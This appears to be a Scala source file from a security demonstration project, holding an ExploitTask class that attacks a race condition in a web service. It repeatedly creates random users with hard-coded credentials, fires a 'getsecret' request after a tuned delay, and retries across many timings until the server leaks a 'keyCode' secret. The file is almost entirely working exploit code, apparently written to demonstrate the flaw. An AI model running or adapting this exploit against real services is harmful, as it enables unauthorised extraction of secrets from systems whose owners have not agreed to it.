package name.brian_gordon.securitydemo

import java.util.concurrent.atomic.AtomicInteger

import scala.concurrent.Future
import scala.concurrent.Promise
import scala.util.Random

import org.json4s._
import dispatch._
import grizzled.slf4j.Logging

/**
 * @author Brian Gordon
 */
class ExploitTask(http: Http, resultPromise: Promise[String], attemptCounter: AtomicInteger) extends Runnable with Logging {
    import ExploitTask._
    var curSleepLength = minSleepLength

    override def run() = {
        val attemptCount = attemptCounter.getAndIncrement()
        if (alertFrequency != 0 && attemptCount % alertFrequency == 0 && attemptCount != 0) {
            debug(s"Completed $attemptCount attempts.")
        }

        // Each run must have a different username.
        val userName = generateUserName()

        // Fire off the two requests with the correct delay between them.
        val addUserFuture = sendAddUserRequest(userName)
        Thread.sleep(curSleepLength)
        val getSecretFuture = sendGetSecretRequest(userName)

        for {
            _ <- addUserFuture.option
            getSecretResult <- getSecretFuture.option
        } {
            getSecretResult.foreach {
                // We want a response that looks like {"keyCode": "SOMETHING"}
                case JObject(List(JField("keyCode", JString(secret)))) => {
                    resultPromise.trySuccess(secret)
                }
                case _ => ()
            }

            // Try again if none of the threads have completed the promise yet.
            if (!resultPromise.isCompleted) {
                stepSleepPeriod()
                run()
            }
        }
    }

    def stepSleepPeriod() = {
        curSleepLength += sleepLengthStep
        if (curSleepLength > maxSleepLength) {
            curSleepLength = minSleepLength
        }
    }

    /**
     * Generate a random 15-character alphanumeric username.
     */
    def generateUserName(): String = {
        BigInt(77, Random).toString(36)
    }

    def sendAddUserRequest(userName: String): Future[_] = {
        val addUserUrl = addUserUrlBase << Map("userName" -> userName)
        http(addUserUrl)
    }

    def sendGetSecretRequest(userName: String): Future[JValue] = {
        val getSecretUrl = getSecretUrlBase << Map("userName" -> userName)
        http(getSecretUrl OK as.json4s.Json)
    }
}

object ExploitTask {
    val minSleepLength = conf.getInt("sleep_tuning.min_sleep_length")
    val maxSleepLength = conf.getInt("sleep_tuning.max_sleep_length")
    val sleepLengthStep = conf.getInt("sleep_tuning.sleep_length_step")
    assert(0 <= minSleepLength)
    assert(minSleepLength <= maxSleepLength)

    val addUserUrlBase = url(conf.getString("url")) << Map("action" -> "adduser", "password" -> "freeman")
    val getSecretUrlBase = url(conf.getString("url")) << Map("action" -> "getsecret", "password" -> "freeman")

    val alertFrequency = conf.getInt("alert_frequency")
}